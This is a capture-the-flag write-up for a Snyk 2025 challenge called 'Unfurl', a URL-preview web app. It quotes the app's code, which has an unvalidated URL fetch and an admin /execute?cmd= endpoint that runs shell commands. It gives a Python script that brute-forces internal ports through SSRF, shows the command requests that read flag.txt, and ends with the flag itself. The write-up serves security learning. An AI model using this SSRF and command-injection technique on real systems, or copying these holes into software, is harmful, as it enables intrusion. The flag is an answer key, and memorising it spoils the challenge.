# Unfurl

> Author: @HuskyHacks
> 
> We've been working on a little side project - it's a URL unfurler! Punch in any site you'd like and you'll get the metadata, main image, the works. We're publishing it open source soon, so we figured we'd let you take a shot at testing its security first!
> 
> The challenge source code is available in the challenge.zip folder. The password is snyk-ftf-2025.
> 
> Use the Dockerfile to run a local instance of the challenge! To build and the container, unzip the contents of the challenge.zip file and run:
> docker build -t [challenge_name] . && docker run -it -p 5000:5000 [challenge_name]

## Solution
This challenge gives us zipped source code and a link to access a website. The website allows users to give URL as input and the website will display the HTML code. 
![image](https://github.com/user-attachments/assets/1a5607a5-1e4c-4bf9-b813-1e711be5d6d5)

From `admin.js`, we can see that there is an admin page other than the default page. It's being hosted locally so we cannot directly access it. The port for admin page is also randomized from `1024` until `4999`.
```js
adminApp.use('/', adminRoutes);

// This should keep people away from the admin panel!
function getRandomPort() {
    const MIN_PORT = 1024;
    const MAX_PORT = 4999;
    let port;
    do {
        port = Math.floor(Math.random() * (MAX_PORT - MIN_PORT + 1)) + MIN_PORT;
    } while (port === 5000);
    return port;
}

const adminPort = getRandomPort();
adminApp.listen(adminPort, '127.0.0.1', () => {
    console.log(`[INFO] Admin app running on http://127.0.0.1:${adminPort}`);
});

```
The default page has `/unfurl` endpoint that will send a POST request to the URL given by the user. Since both websites are hosted on the same server, we can use this endpoint to launch an SSRF attack on the admin page.

```js
router.post('/unfurl', async (req, res) => {
    const { url } = req.body;

    if (!url) {
        return res.status(400).json({ error: 'No URL provided!' });
    }

    try {
        const response = await axios.get(url);
        const html = response.data;
        const $ = cheerio.load(html);

        const title = $('title').text() || 'No title found';
        const description = $('meta[name="description"]').attr('content') || 'No description found';

        let image = $('meta[property="og:image"]').attr('content') || $('link[rel="icon"]').attr('href') || '';
        if (image && !image.startsWith('http')) {
            const urlObj = new URL(url);
            image = `${urlObj.origin}${image}`;
        }

        console.log(`[INFO] Unfurled metadata: Title: "${title}", Description: "${description}", Image: "${image}"`);

        res.json({ title, description, html, image });
    } catch (error) {
        console.error(`[ERROR] Failed to unfurl URL: ${error.message}`);
        res.status(404).json({ error: 'Failed to unfurl the URL.' });
    }
});
```

First, we need to find the port number for the admin page. By utilizing /unfurl endpoint, we can create a script that will fuzz the port number. If the port number shows a response, then it is the admin page. In this case, admin page is in `http://localhost:1539`.
```py
import requests
import json
import threading
from concurrent.futures import ThreadPoolExecutor

# Target endpoint
TARGET_URL = "http://challenge.ctf.games:32079/unfurl"

START_PORT = 1024
END_PORT = 4999

THREADS = 10

# Lock for thread-safe printing
lock = threading.Lock()

def try_port(port):
    """Sends a POST request with a given port in the URL."""
    data = {"url": f"http://localhost:{port}/"}
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(TARGET_URL, headers=headers, data=json.dumps(data), timeout=5)

        # Print only successful or interesting responses
        if response.status_code == 200 and "error" not in response.text.lower():
            with lock:
                print(f"[+] Port {port} is open! Response: {response.text}")
        else:
            with lock:
                print(f"[-] Port {port} - No interesting response")
    
    except requests.exceptions.RequestException:
        with lock:
            print(f"[!] Failed to connect to port {port}")

# Multithreading for faster brute-force
def main():
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(try_port, range(START_PORT, END_PORT + 1))

if __name__ == "__main__":
    main()
```

Now, we can access admin page from the default page. According to `adminRoutes.js`, there are several endpoints that we can access like `/`, `/logs` and `settings`. But, the most interesting is `/execute`, where we can send `cmd` parameter to the endpoint, and it will execute it.

You can test by sending `/execute?cmd=whoami;` to check if the command is being executed successfully. Upon further investigation, the flag is in flag.txt. 

`http://localhost:1539/execute?cmd=cat flag.txt;`
![image](https://github.com/user-attachments/assets/f7b433b2-5205-44a5-a1cb-a022d0f988ac)

## Flag
```
flag{e1c96ccca8777b15bd0b0c7795d018ed}
```
